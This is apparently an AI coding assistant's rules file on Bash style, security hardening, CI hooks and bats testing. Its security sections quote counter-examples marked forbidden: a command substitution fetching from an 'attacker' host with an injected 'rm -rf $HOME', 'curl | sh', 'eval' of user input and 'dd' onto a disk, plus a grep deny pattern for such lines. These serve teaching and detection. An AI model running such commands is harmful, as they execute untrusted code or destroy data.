---
name: bash-scripting-patterns
description: Bash + shell scripting discipline — strict header (set -euo pipefail; IFS), naming conventions (kebab-case scripts, snake_case functions/vars, SCREAMING_SNAKE_CASE constants), always-quoted variables, defaults via ${var:-default}, getopts for arguments, structured logging to stderr, cleanup via trap, no backticks (use $(cmd)), no eval with user input, no rm -rf on unset vars, ShellCheck strict + shfmt format-check enforced. Auto-fires on shell scripts.
paths:
  - "**/*.sh"
  - "**/*.bash"
  - "**/*.zsh"
  - "**/.bashrc"
  - "**/.zshrc"
  - "**/.bash_profile"
  - "**/.profile"
---

> Migrated 2026-06-02 from `~/.claude/rules-library/bash/` as part of the lazy-rules-loading plan. Phase H will delete the source files.

# bash-scripting-patterns

<!-- ============================================================
     Section: bash/coding-style.md
     ============================================================ -->

# Bash / Shell Coding Style

> Auto-fires on every `*.sh`, `*.bash`, `*.zsh`, file with
> `#!/usr/bin/env bash` or `#!/bin/bash` shebang, `.bashrc`,
> `.zshrc`. Standards: **Bash Reference Manual (GNU)**, **Google
> Shell Style Guide**, **ShellCheck**, **shfmt**, **POSIX sh
> spec** (when portability required).

## Core Principle

**Bash is for short-lived scripts (< 100 LOC). For anything
longer, use Python / Go / Rust. Every script starts with
`#!/usr/bin/env bash` + `set -euo pipefail`; arguments handled
via `getopts` or `getopt -l`; quoted variables ALWAYS; functions
return integer exit codes; output structured for the next pipe
in line.**

## Mandatory header

```bash
#!/usr/bin/env bash
#
# script-name.sh — one-line summary
#
# Usage:
#   script-name.sh [OPTIONS] <ARG>
#
# Options:
#   -h, --help    show this help
#   -v, --verbose enable verbose logging
#
set -euo pipefail
IFS=$'\n\t'  # safer word-splitting
```

Why each flag:

- `-e` — exit on any command failure
- `-u` — exit on unbound variable
- `-o pipefail` — exit if any pipe component fails (not just
  the last)
- `IFS=$'\n\t'` — prevents space-splitting of filenames

## Naming

| Object | Convention | Example |
| --- | --- | --- |
| Script name | kebab-case | `deploy-staging.sh` |
| Function | snake_case | `parse_args`, `cleanup_temp_files` |
| Variable | snake_case | `output_dir`, `retry_count` |
| Local variable | inside function with `local` keyword | `local count=0` |
| Constant / env | SCREAMING_SNAKE_CASE | `MAX_RETRIES`, `AWS_REGION` |
| Boolean | `is_*` / `has_*` | `is_verbose`, `has_aws_cli` |

## Variables

```bash
# ALWAYS quote variables
echo "$user_input"           # quoted (correct)
echo $user_input             # unquoted (wrong — word-splits)

# Use ${var:-default} for defaults
log_level="${LOG_LEVEL:-info}"

# Required variables — fail fast if missing
db_url="${DATABASE_URL:?DATABASE_URL is required}"

# Arrays use ((${#arr[@]})) for length; "${arr[@]}" for expansion
declare -a files=("$@")
echo "Processing ${#files[@]} files"
for f in "${files[@]}"; do
    process "$f"
done
```

## Functions

```bash
# Function definition with `function` keyword OR bare name + ();
# pick ONE per project. Local-by-default for all internal vars.
function process_file() {
    local input_file="$1"
    local output_file="${2:-/dev/stdout}"

    if [[ ! -f "$input_file" ]]; then
        log_error "input not found: $input_file"
        return 1
    fi

    # ... process ...
    return 0
}

# Call sites quote everything
process_file "$input" "$output"
```

## Argument parsing

```bash
# Modern: getopts (POSIX-portable but no long options)
usage() {
    cat <<EOF
Usage: $0 [-v] [-o OUTPUT] FILE
EOF
}

verbose=false
output=""

while getopts ":hvo:" opt; do
    case "$opt" in
        h)  usage; exit 0 ;;
        v)  verbose=true ;;
        o)  output="$OPTARG" ;;
        \?) echo "Unknown option: -$OPTARG" >&2; usage; exit 1 ;;
        :)  echo "Option -$OPTARG requires an argument" >&2; exit 1 ;;
    esac
done
shift $((OPTIND - 1))

if [[ $# -lt 1 ]]; then
    echo "Missing FILE argument" >&2
    usage
    exit 1
fi
file="$1"
```

For long-option support, `getopt -l` (GNU only — not on macOS
without `coreutils`). For complex CLIs, use Python's argparse OR
write the tool in Go/Rust.

## Logging

```bash
# Log to stderr; reserve stdout for the script's actual output
log_info()  { printf '[INFO]  %s\n' "$*" >&2; }
log_warn()  { printf '[WARN]  %s\n' "$*" >&2; }
log_error() { printf '[ERROR] %s\n' "$*" >&2; }
log_debug() { [[ "${LOG_LEVEL:-info}" == "debug" ]] && printf '[DEBUG] %s\n' "$*" >&2; }

# With colour (when stderr is a TTY)
if [[ -t 2 ]]; then
    RED='\033[0;31m'
    GREEN='\033[0;32m'
    NC='\033[0m'
else
    RED='' GREEN='' NC=''
fi
log_error() { printf "${RED}[ERROR]${NC} %s\n" "$*" >&2; }
```

## Cleanup + traps

```bash
# Always clean up temp files via trap
TMPDIR="$(mktemp -d)"
cleanup() {
    rm -rf "$TMPDIR"
}
trap cleanup EXIT

# Multiple traps — chain them
trap 'cleanup; log_error "interrupted"; exit 130' INT TERM
```

## File length

Per `~/.claude/rules-library/common/extreme-lint-policy.md` — shell
files capped at 500 lines. Beyond that, the right answer is a
different language.

## Idioms

```bash
# Test file exists + readable
if [[ -r "$file" ]]; then ...; fi

# Test variable is set + non-empty
if [[ -n "${var:-}" ]]; then ...; fi

# Test string equality (use [[ ]] not [ ])
if [[ "$status" == "active" ]]; then ...; fi

# Arithmetic (( ))
if (( count > 0 )); then ...; fi
count=$(( count + 1 ))

# Command substitution
result="$(date +%s)"
# NEVER use backticks `...` — unreadable + can't nest cleanly

# Heredoc
cat <<'EOF' > "$output"
literal $variable here
EOF

# Heredoc with substitution
cat <<EOF > "$output"
expanded $variable here
EOF
```

## Cross-references

- `~/.claude/rules-library/common/coding-style.md`
- `~/.claude/rules-library/bash/no-discards.md`
- `~/.claude/rules-library/bash/security.md`
- `~/.claude/rules-library/bash/testing.md`
- `~/.claude/rules-library/bash/patterns.md`
- Bash Reference Manual (gnu.org/software/bash/manual)
- Google Shell Style Guide
- ShellCheck wiki (github.com/koalaman/shellcheck/wiki)

---

<!-- ============================================================
     Section: bash/hooks.md
     ============================================================ -->

# Bash / Shell Hooks

> Auto-fires on every `*.sh`, `*.bash`, `*.zsh` file. Sister to
> `~/.claude/rules-library/common/hooks.md`.

## Pre-commit gates

`.githooks/pre-commit`:

```bash
#!/usr/bin/env bash
set -euo pipefail

staged_shell=$(git diff --cached --name-only --diff-filter=ACMR \
    | grep -E '\.(sh|bash|zsh)$' || true)
[ -z "$staged_shell" ] && exit 0

# Lint
echo "$staged_shell" | xargs shellcheck -S style

# Format
echo "$staged_shell" | xargs shfmt -d -i 4 -ci -bn -sr

# Secret scan
echo "$staged_shell" | xargs gitleaks detect --no-banner --source

# Verify strict mode
for f in $staged_shell; do
    if ! head -10 "$f" | grep -qE 'set -[a-z]*e[a-z]*o pipefail'; then
        echo "ERROR: $f missing 'set -euo pipefail'"
        exit 1
    fi
done
```

`.githooks/pre-push`:

```bash
#!/usr/bin/env bash
set -euo pipefail

# Run bats tests if any
if [ -d tests/ ] && find tests/ -name '*.bats' -print -quit | grep -q .; then
    bats tests/
fi
```

## CI workflow

```yaml
name: Shell CI

on:
  pull_request:
    paths:
      - '**/*.sh'
      - '**/*.bash'

jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<sha>

      - name: ShellCheck
        uses: ludeeus/action-shellcheck@<sha>
        with:
          severity: style
          scandir: '.'

      - name: shfmt
        run: |
          curl -sSL https://github.com/mvdan/sh/releases/latest/download/shfmt_linux_amd64 \
              -o /tmp/shfmt
          chmod +x /tmp/shfmt
          /tmp/shfmt -d -i 4 -ci -bn -sr .

      - name: gitleaks
        uses: gitleaks/gitleaks-action@<sha>

  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<sha>
        with: { submodules: recursive }

      - name: Install bats
        run: |
          sudo apt-get update
          sudo apt-get install -y bats kcov

      - name: Run bats
        run: bats tests/*.bats

      - name: Coverage with kcov
        run: |
          kcov --bash-dont-parse-binary-dir \
               --include-pattern=.sh \
               coverage/ \
               bats tests/
          # Fail if coverage < 80%
          coverage_pct=$(jq '.percent_covered' coverage/index.json)
          if (( $(echo "$coverage_pct < 80" | bc -l) )); then
              echo "Coverage $coverage_pct% < 80%"
              exit 1
          fi

      - uses: codecov/codecov-action@<sha>
        with: { files: coverage/index.json }
```

## EditorConfig (for shfmt + IDE consistency)

`.editorconfig`:

```ini
[*.{sh,bash,zsh}]
indent_style = space
indent_size = 4
end_of_line = lf
charset = utf-8
trim_trailing_whitespace = true
insert_final_newline = true
```

## Pre-push checklist for shell scripts

When changing a script that ships to production:

```bash
# 1. Lint clean
shellcheck -S style script.sh

# 2. Format clean
shfmt -d -i 4 -ci -bn -sr script.sh

# 3. Tests pass
bats tests/*.bats

# 4. Strict mode in place
head -10 script.sh | grep -q 'set -euo pipefail'

# 5. Trap for cleanup
grep -q 'trap.*EXIT' script.sh

# 6. No hardcoded secrets
gitleaks detect --source script.sh

# 7. No dangerous patterns
grep -nE 'rm -rf /[^ ]*$|eval "\$|curl.*\| *sh' script.sh && exit 1
```

## Cross-references

- `~/.claude/rules-library/common/hooks.md`
- `~/.claude/rules-library/common/extreme-lint-policy.md`
- `~/.claude/rules-library/common/secrets-management.md`
- `~/.claude/rules-library/bash/no-discards.md`
- `~/.claude/rules-library/bash/testing.md`
- ShellCheck (shellcheck.net)
- shfmt (github.com/mvdan/sh)
- bats-core (bats-core.readthedocs.io)

---

<!-- ============================================================
     Section: bash/no-discards.md
     ============================================================ -->

# Bash / Shell — No-Discards Extension

> Auto-fires on every `*.sh`, `*.bash`, `*.zsh` file. Extends
> `~/.claude/rules-library/common/no-discards.md`. Tooling: **ShellCheck
> -S style**, **shfmt -d**, **bats** for tests.

## Core Principle

**`set -euo pipefail` mandatory; every variable quoted; every
command's exit status checked OR explicitly piped to a real
handler; no `|| true` to silence errors; no `eval` with user
input; functions return integer exit codes; subshells observable
via their exit code.**

## Banned patterns

### 1. Missing `set -euo pipefail`

```bash
# FORBIDDEN — silently continues on errors
#!/usr/bin/env bash
do_thing
next_step

# CORRECT
#!/usr/bin/env bash
set -euo pipefail
do_thing
next_step
```

### 2. Unquoted variables

```bash
# FORBIDDEN — splits on whitespace; fails on filenames with spaces
rm -rf $dir
mv $src $dst

# CORRECT
rm -rf "$dir"
mv "$src" "$dst"
```

ShellCheck `SC2086`. ENFORCED.

### 3. `|| true` to silence

```bash
# FORBIDDEN — hides real failures
risky_command || true
maybe_install || true

# CORRECT — handle the specific exit code
if ! risky_command; then
    log_warn "risky_command failed; continuing with fallback"
    fallback_command
fi

# OR if the failure is genuinely expected on some inputs:
risky_command || {
    log_debug "expected non-zero on missing-resource path"
}
```

### 4. Backticks for command substitution

```bash
# FORBIDDEN — unreadable, can't nest, deprecated
result=`date +%s`

# CORRECT
result="$(date +%s)"
nested="$(echo "$(date +%s)-$(uuid)")"
```

ShellCheck `SC2006`. ENFORCED.

### 5. `eval` with user input

```bash
# FORBIDDEN — RCE
eval "$user_input"

# CORRECT — case dispatch on known commands
case "$user_input" in
    start)  start_service ;;
    stop)   stop_service ;;
    *)      log_error "unknown command: $user_input"; exit 1 ;;
esac
```

ShellCheck `SC2086` / `SC2294`. ENFORCED.

### 6. `cd $dir` without check

```bash
# FORBIDDEN — if cd fails, the rest runs in the wrong dir
cd $build_dir
rm -rf *.tmp

# CORRECT
cd "$build_dir" || { log_error "cannot cd to $build_dir"; exit 1; }
rm -rf -- *.tmp
# (the -- prevents `*.tmp` being parsed as an option)
```

### 7. `rm -rf $var` where var could be empty

```bash
# FORBIDDEN — if $tmp is unset, rm -rf / runs (catastrophic)
rm -rf "$tmp/build"

# CORRECT — use set -u (already in pipefail block) + check
: "${tmp:?tmp must be set}"
rm -rf "$tmp/build"
```

### 8. Pipe to read in subshell (loses variable state)

```bash
# FORBIDDEN — variables set in the loop don't persist
cat file.txt | while read line; do
    count=$((count + 1))  # this `count` is in a subshell
done
echo "$count"  # prints original value

# CORRECT — redirect input instead of pipe
count=0
while read -r line; do
    count=$((count + 1))
done < file.txt
echo "$count"
```

ShellCheck `SC2030` / `SC2031`. ENFORCED.

### 9. `for` over `ls` output

```bash
# FORBIDDEN — breaks on filenames with spaces
for f in $(ls *.txt); do
    process $f
done

# CORRECT — glob directly
shopt -s nullglob  # empty match = empty list, not literal "*.txt"
for f in *.txt; do
    process "$f"
done
shopt -u nullglob
```

ShellCheck `SC2045`. ENFORCED.

### 10. Hardcoded credentials

```bash
# FORBIDDEN
export AWS_SECRET_ACCESS_KEY="abc123..."
DB_PASSWORD="hunter2"

# CORRECT — vault / env / Keychain. Profile name is per-user
# config (e.g. via aws-vault); the script reads from the caller's
# environment, never hardcodes it.
: "${AWS_PROFILE:?AWS_PROFILE must be set (e.g. via aws-vault)}"
DB_PASSWORD="$(security find-generic-password \
    -a "$USER" -s "$DB_PASSWORD_KEYCHAIN_ITEM" -w)"
```

Per `~/.claude/rules-library/common/secrets-management.md`.

### 11. `cd -` / `popd` without `pushd`

```bash
# WRONG — uses dir-stack but assumes one was pushed
cd build/
make
cd -          # works only if PWD was set by `cd`, brittle

# CORRECT — pushd/popd pair
pushd build/ > /dev/null
make
popd > /dev/null

# OR subshell — auto-revert
(cd build/ && make)
```

### 12. Mixing `[` and `[[`

```bash
# WORKING but inconsistent
[ "$x" = "y" ] && [[ "$y" -gt 0 ]]

# CORRECT — consistent
[[ "$x" == "y" ]] && [[ "$y" -gt 0 ]]
```

`[[ ]]` is bash-specific but supports regex (`=~`), nested
conditions, and avoids word-splitting traps. POSIX scripts use
`[ ]` exclusively.

### 13. `$@` unquoted

```bash
# FORBIDDEN
do_thing $@   # word-splits on whitespace in args

# CORRECT
do_thing "$@"  # preserves arg boundaries
```

### 14. Echo for raw output

```bash
# AMBIGUOUS — echo handles -n and -e differently across shells
echo "$user_data"

# CORRECT — printf is portable
printf '%s\n' "$user_data"
```

For pretty user-facing output, `echo` is fine; for data piped
to other commands, `printf`.

### 15. Comments without `#!` shebang line interpretation

```bash
# FORBIDDEN — relies on /bin/bash being the system bash (may be old)
#!/bin/bash

# CORRECT — env finds bash in PATH
#!/usr/bin/env bash
```

The `/usr/bin/env bash` shebang lets the user's `bash` win on
macOS where `/bin/bash` is stuck at 3.2 forever (GPL3 license).

## Required ShellCheck config

`.shellcheckrc`:

```ini
# Strict severity — catches style issues
severity=style

# Disable rules that conflict with our conventions
disable=SC2034   # unused variable (often legitimate for exports)
disable=SC1091   # source file not found in CI
```

Most projects need NO disables. The above are illustrative —
enable everything unless there's a real conflict.

## Required shfmt config

```bash
shfmt -d -i 4 -ci -bn -sr script.sh
```

Flags:

- `-i 4` — indent with 4 spaces
- `-ci` — switch case indent
- `-bn` — binary ops at line start when wrapped
- `-sr` — redirect operators followed by space

## Verification block

```text
Bash sweep (this turn):
  - shellcheck -S style: 0 findings
  - shfmt -d -i 4 -ci -bn -sr: clean
  - bats tests/: PASS
  - All scripts start with `set -euo pipefail`
```

## Cross-references

- `~/.claude/rules-library/common/no-discards.md`
- `~/.claude/rules-library/common/no-silent-failures.md`
- `~/.claude/rules-library/common/secrets-management.md`
- `~/.claude/rules-library/bash/coding-style.md`
- `~/.claude/rules-library/bash/security.md`
- ShellCheck wiki (github.com/koalaman/shellcheck/wiki)
- Bash Pitfalls (mywiki.wooledge.org/BashPitfalls)

---

<!-- ============================================================
     Section: bash/patterns.md
     ============================================================ -->

# Bash / Shell Patterns

> Auto-fires on every `*.sh`, `*.bash`, `*.zsh` file. Standards:
> **Bash Hackers Wiki**, **Greg's Wiki / BashFAQ**, **Google Shell
> Style Guide**, **The Linux Command Line (Shotts)**.

## Core Principle

**Bash is the glue language for "run process A, pipe to B, dump
to file C." When the glue grows logic (loops with conditionals,
arrays, complex string manipulation), switch to Python / Go /
Rust. Keep scripts short, focused, and replaceable.**

## When to use Bash — and when not

| Use Bash | Use a real language |
| --- | --- |
| `< 50 LOC` | `> 100 LOC` |
| Process orchestration | Business logic |
| File operations + pipes | Data structures + iteration |
| One-shot scripts | Long-running services |
| Cron jobs | Scheduled workers with state |
| Deploy / bootstrap scripts | Anything with retry / backoff |
| CI workflow steps | CI workflow controllers |

## Strict-mode template (every script starts here)

```bash
#!/usr/bin/env bash
#
# <script-name> — <one-line description>
#
# Usage: <script-name> [OPTIONS] <ARGS>
#
set -euo pipefail
IFS=$'\n\t'

readonly SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
readonly SCRIPT_NAME="$(basename "$0")"

# Cleanup
TMPDIR="$(mktemp -d)"
cleanup() { rm -rf "$TMPDIR"; }
trap cleanup EXIT
trap 'echo "interrupted" >&2; exit 130' INT TERM

# Logging
log()       { printf '[%s] %s\n' "$(date -u +%FT%TZ)" "$*" >&2; }
log_info()  { log "INFO  $*"; }
log_warn()  { log "WARN  $*"; }
log_error() { log "ERROR $*"; }
log_debug() { [[ "${VERBOSE:-0}" == "1" ]] && log "DEBUG $*"; }

usage() {
    cat <<EOF
Usage: $SCRIPT_NAME [OPTIONS] <ARG>

Options:
  -h, --help     show this help
  -v, --verbose  enable debug logging
EOF
}

# ... main script body ...
```

## Long-options via `getopt` (GNU only)

```bash
# macOS: install via `brew install gnu-getopt` + adjust PATH
OPTS="$(getopt -o hvo: --long help,verbose,output: -n "$SCRIPT_NAME" -- "$@")"
eval set -- "$OPTS"

verbose=false
output=""
while true; do
    case "$1" in
        -h|--help)    usage; exit 0 ;;
        -v|--verbose) verbose=true; shift ;;
        -o|--output)  output="$2"; shift 2 ;;
        --)           shift; break ;;
    esac
done
```

## Process pipeline patterns

```bash
# Pattern: read stdin → transform → write stdout
process_stream() {
    while IFS= read -r line; do
        # transform
        printf '%s\n' "${line^^}"  # uppercase
    done
}
cat input.txt | process_stream > output.txt

# Pattern: capture exit status of every pipe member (pipefail does this)
ls | grep foo | wc -l    # exit = last command's; with pipefail, any failure

# Pattern: parallel execution (xargs -P)
find . -name '*.log' -print0 | xargs -0 -n 1 -P 4 gzip
```

## Retry with backoff

```bash
retry() {
    local max_attempts="${1:-3}"
    local delay="${2:-1}"
    shift 2
    local attempt=1
    while (( attempt <= max_attempts )); do
        if "$@"; then
            return 0
        fi
        log_warn "attempt $attempt/$max_attempts failed; retrying in ${delay}s"
        sleep "$delay"
        delay=$((delay * 2))   # exponential
        attempt=$((attempt + 1))
    done
    log_error "all $max_attempts attempts failed"
    return 1
}

retry 5 2 curl --fail -o data.json https://api.example.com/data
```

## Dispatch pattern (subcommands)

```bash
main() {
    local cmd="${1:-help}"
    shift || true
    case "$cmd" in
        build)   cmd_build "$@" ;;
        deploy)  cmd_deploy "$@" ;;
        status)  cmd_status "$@" ;;
        help|-h|--help) cmd_help ;;
        *)       log_error "unknown subcommand: $cmd"; cmd_help; exit 1 ;;
    esac
}

cmd_build()  { ... }
cmd_deploy() { ... }
cmd_status() { ... }
cmd_help()   { usage; }

main "$@"
```

## Error propagation pattern

```bash
# Capture both stdout and exit code from a function
run_with_status() {
    local _output
    local _status
    _output="$("$@" 2>&1)"
    _status=$?
    printf '%s\n' "$_output"
    return $_status
}

if output="$(run_with_status do_thing)"; then
    log_info "do_thing succeeded: $output"
else
    log_error "do_thing failed: $output"
    exit 1
fi
```

## Configuration files

```bash
# Pattern: shellcheck-disable-free config sourcing
load_config() {
    local config_file="${1:-/etc/myapp/config.sh}"
    if [[ -r "$config_file" ]]; then
        # shellcheck source=/dev/null
        source "$config_file"
    fi
}
```

Or use a `.env`-style key=value file parsed safely (no source):

```bash
parse_env_file() {
    local file="$1"
    while IFS='=' read -r key value; do
        [[ -z "$key" || "$key" =~ ^# ]] && continue
        # strip quotes
        value="${value%\"}"
        value="${value#\"}"
        printf 'export %s=%q\n' "$key" "$value"
    done < "$file"
}
eval "$(parse_env_file "$ENV_FILE")"
```

## Common pitfalls

| Pitfall | Fix |
| --- | --- |
| `[ $var = "foo" ]` (unquoted) | Use `[[ "$var" == "foo" ]]` |
| `for f in *.txt` (no nullglob) | `shopt -s nullglob` first |
| `read line` (no `-r`) | `read -r line` (preserves backslashes) |
| `while read; do; sleep 1; done` (CPU spin) | Use `read -t` for timeout |
| `if [ $? -eq 0 ]` (lossy) | Use `if cmd; then` directly |
| `cat file \| while read` (subshell) | `while read; do; done < file` |
| `echo -e` (non-portable) | `printf '%b'` |
| `[ "$x" -eq "$y" ]` on non-integers | Test with `[[ "$x" == "$y" ]]` |
| `command > file 2> file` (race) | `command > file 2>&1` |

## Cross-references

- `~/.claude/rules-library/common/patterns.md`
- `~/.claude/rules-library/bash/coding-style.md`
- `~/.claude/rules-library/bash/no-discards.md`
- `~/.claude/rules-library/bash/security.md`
- Bash Hackers Wiki
- BashFAQ (mywiki.wooledge.org/BashFAQ)
- ShellCheck wiki

---

<!-- ============================================================
     Section: bash/security.md
     ============================================================ -->

# Bash / Shell Security

> Auto-fires on every `*.sh`, `*.bash`, `*.zsh` file. Sister to
> `~/.claude/rules-library/common/security.md`. Standards: **OWASP Shell
> Injection Cheat Sheet**, **POSIX shell command-injection
> taxonomy**, **CWE-78 (OS Command Injection)**, **CWE-77 (Command
> Injection)**, **CWE-88 (Argument Injection)**.

## Core Principle

**Bash scripts run with the privileges of the caller — usually the
deploying engineer or CI runner. Treat every variable that
crosses a boundary as untrusted input. No `eval`; no
unsanitised command substitution; no SUID shell scripts; no
unsafe `IFS`; secrets from env / vault never from `ps`-visible
arguments.**

## OWASP — Bash specifics

### CWE-78 / CWE-77 — OS Command Injection

```bash
# FORBIDDEN — RCE
filename="$(curl http://attacker/payload)"
ls "$filename"   # injected: `; rm -rf $HOME`

# More obvious:
eval "ls $user_input"
```

```bash
# CORRECT — never interpolate user input into a command string
# Use array-style invocation
declare -a cmd=("ls" "$user_input")
"${cmd[@]}"

# OR — explicit allowlist
case "$user_input" in
    start|stop|status) systemctl "$user_input" myservice ;;
    *) log_error "unknown action"; exit 1 ;;
esac
```

### CWE-88 — Argument injection

```bash
# WRONG — leading `--` in user input
filename="--help"   # or "--delete"
rm "$filename"      # interpreted as flag

# CORRECT — use `--` to terminate options
rm -- "$filename"
```

### Path traversal

```bash
# WRONG — `..` escapes the base directory
cp "$base_dir/$user_path" /dest/

# CORRECT — realpath + prefix check
resolved="$(realpath -m "$base_dir/$user_path")"
case "$resolved" in
    "$base_dir"/*) cp "$resolved" /dest/ ;;
    *) log_error "path traversal attempt: $user_path"; exit 1 ;;
esac
```

### Secrets in argv

```bash
# FORBIDDEN — argv is visible via `ps`
mysql --password="hunter2" ...
curl -u "user:hunter2" ...

# CORRECT — env var (process-private)
MYSQL_PWD="$DB_PASSWORD" mysql ...
curl --netrc-file <(printf 'machine api.example.com login user password %s\n' "$API_TOKEN") ...

# OR — read from stdin
mysql --defaults-file=<(printf '[client]\npassword=%s\n' "$DB_PASSWORD") ...
```

### Temp file races

```bash
# FORBIDDEN — predictable name
tmp="/tmp/myscript-$$"

# CORRECT — mktemp creates with mode 0600
tmp="$(mktemp)"
trap 'rm -f "$tmp"' EXIT

# Temp dir
tmpdir="$(mktemp -d)"
trap 'rm -rf "$tmpdir"' EXIT
```

### `umask` for created files

```bash
# At the top of a script that writes secrets:
umask 077  # files created mode 0600
echo "$secret" > config.local
```

### Don't grant SUID to shell scripts

Linux ignores SUID on shell scripts by default (security
historical reason). NEVER set it via `chmod u+s script.sh`;
NEVER wrap a shell script in a SUID C wrapper. Use a real
program written in Go / Rust / C with proper capability
handling.

## Curl / wget hardening

```bash
# CORRECT — fail on HTTP error, follow redirects up to N, timeout
curl --fail \
     --silent \
     --show-error \
     --max-time 30 \
     --max-redirs 5 \
     --tlsv1.2 \
     --user-agent "myscript/1.0" \
     "https://api.example.com/path" \
     -o output.json

# Verify TLS — NEVER --insecure / -k in production
# If self-signed cert is genuinely needed, use --cacert path/to/ca.pem
```

```bash
# FORBIDDEN — `curl | sh` accepts whatever the server returns
curl https://example.com/install | sh

# CORRECT — download, verify, then execute
curl --fail --silent --show-error -o installer.sh "$URL"
echo "$EXPECTED_SHA256  installer.sh" | sha256sum --check --quiet
bash installer.sh
```

Per `~/.claude/rules-library/common/install-allowlist.md`.

## SSH / remote execution

```bash
# Quote remote command properly
ssh "$host" "ls /tmp/$file"        # $file expanded LOCALLY (correct)
ssh "$host" 'ls /tmp/$file'        # $file expanded REMOTELY (different
                                    #  meaning; intentional only when REMOTE_ENV)

# Quote arguments for remote shell
ssh "$host" "$(printf 'ls %q' "$file")"  # %q shell-escapes
```

## Logging — no secrets

```bash
# FORBIDDEN
log_info "logged in with token=$API_TOKEN"

# CORRECT
log_info "logged in (token sha256: $(printf '%s' "$API_TOKEN" | sha256sum | head -c 8))"
```

## Required tooling

```bash
shellcheck -S style script.sh
shfmt -d -i 4 script.sh
# Bandit-equivalent for shell:
gixy nginx_config.conf       # if shell controls nginx
checkov --framework dockerfile,kubernetes,helm  # IaC sister
```

For credential scanning in scripts:

```bash
gitleaks detect --source script.sh
trufflehog filesystem --no-update script.sh
```

## Cross-references

- `~/.claude/rules-library/common/security.md`
- `~/.claude/rules-library/common/secrets-management.md`
- `~/.claude/rules-library/common/install-allowlist.md`
- `~/.claude/rules-library/bash/no-discards.md`
- `~/.claude/rules-library/bash/coding-style.md`
- OWASP Shell Injection Cheat Sheet
- Bash Pitfalls (mywiki.wooledge.org/BashPitfalls)
- CWE-78 (cwe.mitre.org)

---

<!-- ============================================================
     Section: bash/testing.md
     ============================================================ -->

# Bash / Shell Testing

> Auto-fires on every `tests/*.bats`, `test_*.sh`, `*_test.sh`,
> `test-*.sh` file. Standards: **bats-core** (Bash Automated
> Testing System), **shunit2**, **POSIX shell** test conventions.

## Core Principle

**Even shell scripts deserve tests. bats-core is the canonical
framework; shunit2 if POSIX-only required. Tests cover the
script's CLI contract (exit codes, stdout, stderr) + the
internal functions' edge cases. Coverage measured via
`kcov` / `bashcov`.**

## bats-core idioms

```bash
#!/usr/bin/env bats
# tests/process_file.bats

setup() {
    load 'test_helper/bats-support/load'
    load 'test_helper/bats-assert/load'
    load 'test_helper/bats-file/load'

    TMPDIR="$(mktemp -d)"
    export PATH="$BATS_TEST_DIRNAME/..:$PATH"
}

teardown() {
    rm -rf "$TMPDIR"
}

@test "process_file with valid input succeeds" {
    run process-file.sh "fixtures/valid.txt"
    assert_success
    assert_output --partial "processed 3 lines"
}

@test "process_file with missing file errors with exit 2" {
    run process-file.sh "/nonexistent"
    assert_failure 2
    assert_output --partial "input not found"
}

@test "process_file outputs to stdout when -o not given" {
    run process-file.sh "fixtures/valid.txt"
    assert_success
    assert_line "line one"
    assert_line "line two"
    assert_line "line three"
}

@test "process_file writes to -o file" {
    out="$TMPDIR/out.txt"
    run process-file.sh -o "$out" "fixtures/valid.txt"
    assert_success
    assert_file_exists "$out"
    assert_file_contains "$out" "line one"
}
```

Run with:

```bash
bats tests/*.bats
```

## What to test

| Aspect | Approach |
| --- | --- |
| Exit codes | `assert_success` (0), `assert_failure N` |
| Stdout | `assert_output --partial "string"` |
| Stderr | Capture via `run 2>&1`; assert on combined output |
| File creation | `assert_file_exists` (bats-file) |
| File content | `assert_file_contains` |
| Environment side effects | Check post-run env |
| Argument parsing | Test `-h`, `-v`, unknown options |
| Error paths | Missing args, malformed input, permission denied |
| Cleanup | Assert temp files removed after `EXIT` trap fires |

## Mocking external commands

```bash
# Override commands in PATH for the test
setup() {
    PATH="$BATS_TEST_DIRNAME/mocks:$PATH"
}

# tests/mocks/curl
#!/usr/bin/env bash
echo "mocked curl response"
exit 0
```

Or use bats-mock:

```bash
load 'test_helper/bats-mock/load'

@test "calls curl with expected args" {
    mock="$(mock_create)"
    mock_set_output "$mock" 'fake response'

    PATH="$(dirname "$mock"):$PATH" run myscript.sh

    assert_equal "$(mock_get_call_args "$mock" 1)" "https://api.example.com"
}
```

## shunit2 (POSIX alternative)

```sh
#!/bin/sh
# tests/process_file_test.sh

testProcessFileSucceeds() {
    output="$(../process-file.sh fixtures/valid.txt)"
    assertEquals 0 $?
    assertContains "$output" "processed"
}

testProcessFileMissingErrors() {
    ../process-file.sh /nonexistent
    assertEquals 2 $?
}

# Load shunit2
. ./shunit2
```

## Coverage with kcov

```bash
# Install: brew install kcov  (or apt-get install kcov)

kcov --bash-dont-parse-binary-dir --include-pattern=.sh \
     "$PWD/coverage" \
     bats tests/

# Open HTML report:
open coverage/index.html
```

For bash specifically, `bashcov` (Ruby-based) also works:

```bash
bashcov bats tests/*.bats
```

## Hard rules

### 1. Tests run in CI on every change

```yaml
- name: Bats tests
  run: |
    git submodule update --init --recursive  # bats-* submodules
    bats tests/
```

### 2. No real network in tests

Mock curl / wget; use local fixtures.

### 3. No real `rm -rf` / `dd if=/dev/zero of=/dev/sda` (obvious)

Tests run in disposable environments (containers / `mktemp -d`).

### 4. Test the CLI shape, not the implementation

```bash
# WRONG — coupled to internal function name
@test "internal helper works" {
    run process-file.sh --debug-internal
}

# RIGHT — test public CLI
@test "process-file produces expected output" {
    run process-file.sh fixtures/valid.txt
    assert_output "expected text"
}
```

### 5. Cover the failure paths

Every error branch in the script has a corresponding test.

### 6. Use fixtures, not inline data

```bash
# WRONG
@test "..." {
    echo "test data line 1" > /tmp/file
    echo "test data line 2" >> /tmp/file
    run myscript /tmp/file
}

# RIGHT
@test "..." {
    run myscript "$BATS_TEST_DIRNAME/fixtures/valid.txt"
}
```

Fixtures live in `tests/fixtures/`.

### 7. Each test is independent

`setup` / `teardown` for state isolation. Run tests in random
order:

```bash
bats --shuffle tests/
```

## Cross-references

- `~/.claude/rules-library/common/testing.md`
- `~/.claude/rules-library/common/extreme-lint-policy.md`
- `~/.claude/rules-library/bash/coding-style.md`
- `~/.claude/rules-library/bash/no-discards.md`
- bats-core docs (bats-core.readthedocs.io)
- shunit2 docs (github.com/kward/shunit2)
- kcov docs (github.com/SimonKagstrom/kcov)

---
